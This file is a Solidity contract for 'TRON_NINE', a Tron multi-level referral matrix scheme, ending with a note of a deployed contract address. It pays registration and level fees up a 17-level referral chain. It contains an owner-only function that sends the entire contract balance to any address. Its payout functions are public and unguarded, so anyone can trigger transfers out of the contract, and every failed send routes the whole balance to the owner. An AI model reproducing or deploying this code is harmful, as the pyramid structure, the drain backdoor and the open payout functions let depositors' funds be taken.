//SourceUnit: tronenine.sol

pragma solidity ^0.5.9;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract TRON_NINE {
    
    
    using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 100 trx;
	uint256[] public REFERRAL_PERCENTS = [500, 200, 100, 50, 30, 10, 10, 10, 10,10,10,10,10,10,10,10,10];
	uint256 constant public PERCENTS_DIVIDER = 1000;

	
	
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        
        
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => bool) activeX6Levels;
        
        mapping(uint8 => X3) x3Matrix;
        mapping(uint8 => X6) x6Matrix;
		
		mapping(uint256 => uint256) levelRefCount;
		
		mapping(uint256 => uint256) globalRferalCount;
// 		mapping(uint256 => uint256) currentOddPosition;
// 		mapping(uint256 => uint256) currentEvenPosition;
		uint256 withdrawRef;
		uint256 bonus;
    }
    
    struct X3 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    
    struct X6 
    {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
        uint256 RefvID;
    }

    uint8 public currentStartingLevel = 1;
    uint8 public constant LAST_LEVEL = 17;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
   // mapping(uint => address) public vIdToAddress;

    uint public lastUserId = 2;
    uint public vId = 2;
    mapping(uint8 => mapping(uint256 => address)) vId_number;
    address public owner;
    
    mapping(uint8 => uint) public levelPrice;
    mapping(uint8 => uint) public blevelPrice;
    mapping(uint8 => uint256) public currentvId;
    mapping(uint8 => uint256) public index;
    	
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
	
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	
	event Withdrawn(address indexed user, uint256 amount);
	
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event MissedEthReceive(address indexed receiver, address indexed from, uint8 matrix, uint8 level);
    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level);
    
    
    constructor(address ownerAddress) public {
	
		
		
        levelPrice[1] = 100 trx;
        levelPrice[2] = 200 trx;
        levelPrice[3] = 250 trx;
        levelPrice[4] = 500 trx;
        levelPrice[5] = 1000 trx;
        levelPrice[6] = 2000 trx;
        levelPrice[7] = 2500 trx;
        levelPrice[8] = 5000 trx;
        levelPrice[9] = 10000 trx;
        levelPrice[10] = 20000 trx;
        levelPrice[11] = 25000 trx;
        levelPrice[12] = 50000 trx;
        levelPrice[13] = 100000 trx;
        levelPrice[14] = 200000 trx;
        levelPrice[15] = 250000 trx;
        levelPrice[16] = 500000 trx;
        levelPrice[17] = 1000000 trx;
        
        
        
        blevelPrice[1] = 100 trx;
        blevelPrice[2] = 200 trx;
        blevelPrice[3] = 250 trx;
        blevelPrice[4] = 500 trx;
        blevelPrice[5] = 1000 trx;
        blevelPrice[6] = 2000 trx;
        blevelPrice[7] = 2500 trx;
        blevelPrice[8] = 5000 trx;
        blevelPrice[9] = 10000 trx;
        blevelPrice[10] = 20000 trx;
        blevelPrice[11] = 25000 trx;
        blevelPrice[12] = 50000 trx;
        blevelPrice[13] = 100000 trx;
        blevelPrice[14] = 200000 trx;
        blevelPrice[15] = 250000 trx;
        blevelPrice[16] = 500000 trx;
        blevelPrice[17] = 1000000 trx;
        
        
                 
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0),
            
            withdrawRef :uint(0),
            bonus: uint(0)
			
		
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
       // vIdToAddress[1] = ownerAddress;

        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            vId_number[i][1]=ownerAddress;
            index[i]=1;
            currentvId[i]=1; 
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
        }   
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

    

     function withdrawLostTRXFromBalance(address payable _sender) public {
        require(msg.sender == owner, "onlyOwner");
        _sender.transfer(address(this).balance);
    }


    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
    
    function buyNewLevel(uint8 matrix, uint8 level) external payable {
       require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(matrix == 1 || matrix == 2, "invalid matrix");
        require(msg.value == levelPrice[level] || msg.value == blevelPrice[level], "invalid price");
        require(level >= 1 && level <= LAST_LEVEL, "invalid level");

        if (matrix == 1) 
        {
            if(level >1)
            {
                 require(users[msg.sender].activeX3Levels[level-1], "buy previous level first");
                 if (users[msg.sender].x3Matrix[level-1].blocked) {
                users[msg.sender].x3Matrix[level-1].blocked = false;
                }
            }
            require(!users[msg.sender].activeX3Levels[level], "level already activated");
            

            
             uint256 newIndex=index[level]+1;
                  vId_number[level][newIndex]=msg.sender;
                  index[level]=newIndex;
          
           
           
           users[users[msg.sender].referrer].globalRferalCount[level] = users[users[msg.sender].referrer].globalRferalCount[level] +1;
           
           uint256 defd = users[users[msg.sender].referrer].globalRferalCount[level];
            
            uint256 uyi=defd.mod(2);
            
            if(uyi == 0)
            {
               address freeX3Referrer = users[msg.sender].referrer;
                users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;
                users[msg.sender].activeX3Levels[level] = true;
                updateX3Referrer(msg.sender, freeX3Referrer, level);
                emit Upgrade(msg.sender, freeX3Referrer, 1, level);

            }
            else
            {
                address freeX3Referrer = findFreeX3Referrer(level);
                users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;
                users[msg.sender].activeX3Levels[level] = true;
                updateX3Referrer(msg.sender, freeX3Referrer, level);
                emit Upgrade(msg.sender, freeX3Referrer, 1, level);

            }
            
         }
        else  if (matrix == 2) 
        {
            
            
            if(level >1)
            {
            require(users[msg.sender].activeX6Levels[level-1], "buy previous level first");
            }
            require(!users[msg.sender].activeX6Levels[level], "level already activated");
            

            if(level == 1)
            {
                
                address freeX6Referrer = findFreeX6ReferrerLevel(msg.sender,level);
                
                users[msg.sender].x6Matrix[level].currentReferrer = freeX6Referrer;
                users[msg.sender].activeX6Levels[level] = true;
                //if(address(freeX6Referrer) != address(0))
                updateX6Referrer(msg.sender, freeX6Referrer, level);
                emit Upgrade(msg.sender, freeX6Referrer, 2, level);
            
            }
            else
            {
                
                
                 if(users[msg.sender].referrer==owner)
                {
                     
             
                    users[msg.sender].x6Matrix[level].currentReferrer = owner;
                    users[msg.sender].activeX6Levels[level] = true;
                    updateX6Referrer(msg.sender, owner, level);
                    emit Upgrade(msg.sender,owner, 2, level);
               
                
                }
                else
                {
                     address freeX6Referrer = findFreeX6ReferrerLevel(users[msg.sender].referrer,level);
                
                
             
                    users[msg.sender].x6Matrix[level].currentReferrer = freeX6Referrer;
                    users[msg.sender].activeX6Levels[level] = true;
                    updateX6Referrer(msg.sender, freeX6Referrer, level);
                    emit Upgrade(msg.sender,freeX6Referrer, 2, level);
               
                
                }
            
            }

        }
        
    } 
    
    function registration(address userAddress, address referrerAddress) private 
    {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        require(msg.value == INVEST_MIN_AMOUNT, "invalid registration cost");
       
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0,
            withdrawRef: 0,
            bonus: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
       // vIdToAddress[vId] = userAddress;
        
        
        //   uint256 newIndex=index[1]+1;
        //           vId_number[1][newIndex]=userAddress;
        //           index[1]=newIndex;
                   
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        vId++;

        users[referrerAddress].partnersCount++;
	
        if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 17; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					
					
						users[upline].levelRefCount[i] = users[upline].levelRefCount[i] +1;
						users[upline].bonus = users[upline].bonus.add(amount);
						
					    
					    
					     sendETHRefLevel(upline, msg.sender, i, amount);
				
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}
		
		
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
        
        
    }
    
    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {
                users[referrerAddress].x3Matrix[level].referrals.push(userAddress);
                
                
        
                if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {
                    
                     emit NewUserPlace(userAddress, referrerAddress, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));
                    return sendETHDividends(referrerAddress, userAddress, 1, level);
                }
                
                emit NewUserPlace(userAddress, referrerAddress, 1, level, 3);
                
                
           
                uint256 defd = users[users[userAddress].referrer].globalRferalCount[level];
                
                uint256 uyi=defd.mod(2);
              
                if(users[referrerAddress].id==currentvId[level])
                currentvId[level]=currentvId[level]+1;  //  After completion of three members 
              
                
                
                //close matrix
                    users[referrerAddress].x3Matrix[level].referrals = new address[](0);
                    // if (!users[referrerAddress].activeX3Levels[level+1] && level != LAST_LEVEL) {
                    //     users[referrerAddress].x3Matrix[level].blocked = true;
                    // }
        
                
                
                
                //create new one by recursion
                if (referrerAddress != owner) {
                    //check referrer active level
                       
                        
                        address freeReferrerAddress = findFreeX3Referrer2(referrerAddress,level);
                        if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {
                            users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;
                            }
                            
                            // uint256 newIndex=index[level]+1;
                            // vId_number[level][newIndex]=referrerAddress;
                            // index[level]=newIndex;
                            
                            users[referrerAddress].x3Matrix[level].reinvestCount++;
                            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);
                            
                            if(address(users[referrerAddress].referrer) != address(0))
                            updateX3Referrer(referrerAddress, users[referrerAddress].referrer, level);
                    
            
                    
                } else {
                    sendETHDividends(owner, userAddress, 1, level);
                    users[owner].x3Matrix[level].reinvestCount++;
                    emit Reinvest(owner, address(0), userAddress, 1, level);
                }
        
        
            
        
    }

    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private 
    {
        users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
        emit NewUserPlace(userAddress,  referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
        return sendETHDividendss(referrerAddress, userAddress, 2, level);
         emit NewUserPlace(userAddress, referrerAddress, 2, level,3);
    
     }
    
    function findFreeX3Referrer(uint8 level) public view returns(address) {
        uint256 id=currentvId[level];
            return idToAddress[id];
    }
    
    
    function findFreeX3Referrer2(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeX3Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
   
    
    function findFreeX6ReferrerLevel(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            
                 if (users[users[userAddress].referrer].activeX6Levels[level]) {
                    return users[userAddress].referrer;
                    
                 }
                 
            
            userAddress = users[userAddress].referrer;
            
        }
        
    }
    
    function findFreeX6ReferrerLevel2(address userAddress, uint8 level) public view returns(address) {
        while (true) {
           if (users[users[userAddress].referrer].activeX6Levels[level]) {
                return users[users[userAddress].referrer].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
    
   
    

	
        
    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }

     function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }

    function usersX3Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool,uint256) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
                users[userAddress].x3Matrix[level].referrals,
                users[userAddress].x3Matrix[level].blocked,
                users[userAddress].x3Matrix[level].reinvestCount
                );
    }

    function usersX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool,uint256) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
                users[userAddress].x6Matrix[level].referrals,
                users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].reinvestCount);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function findEthReceiver(address userAddress, address _from, uint8 matrix, uint8 level) private returns(address, bool) {
        address receiver = userAddress;
        bool isExtraDividends;
        if (matrix == 1) {
            while (true) {
                if (users[receiver].x3Matrix[level].blocked) {
                    emit MissedEthReceive(receiver, _from, 1, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x3Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        } 
        else {
            while (true) {
                if (users[receiver].x6Matrix[level].blocked) {
                    emit MissedEthReceive(receiver, _from, 2, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x6Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        }
    }

    function sendETHDividends(address userAddress, address _from, uint8 matrix, uint8 level) public {
        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, matrix, level);

        if (!address(uint160(receiver)).send(levelPrice[level])) {
            address(uint160(owner)).send(address(this).balance);
            return;
        }
        
        if (isExtraDividends) {
            emit SentExtraEthDividends(_from, receiver, matrix, level);
        }
    }

    function sendETHDividendss(address userAddress, address _from, uint8 matrix, uint8 level) public 
    {
      if (!address(uint160(userAddress)).send(blevelPrice[level])) 
        {
            address(uint160(owner)).send(address(this).balance);
         
            return;
        }
        
    }
    
    function sendETHRefLevel(address userAddress, address _from, uint256 level, uint256 amount) public 
    {
      if (!address(uint160(userAddress)).send(amount))
        {
            address(uint160(owner)).send(address(this).balance);
         
            return;
        }
        
    }
    
    function getUserDownlineCount(address userAddress) public view returns(uint256[] memory) {
		uint256[] memory levelRefCountss = new uint256[](17);
		for(uint8 j=0; j<=16; j++)
		{
		  levelRefCountss[j]  =users[userAddress].levelRefCount[j];
		}
		return (levelRefCountss);
	}
	
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	
	function getGlobalReferalMemberCount(address userAddress, uint level) public view returns(uint256) {
		return users[userAddress].globalRferalCount[level];
			 //users[userAddress].currentOddPosition[level],
			// users[userAddress].currentEvenPosition[level]);
	}
	

	
	

    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}

///  working contract TU6n58p2aNst6JZcpBcw1TRmNdkWNM7C3F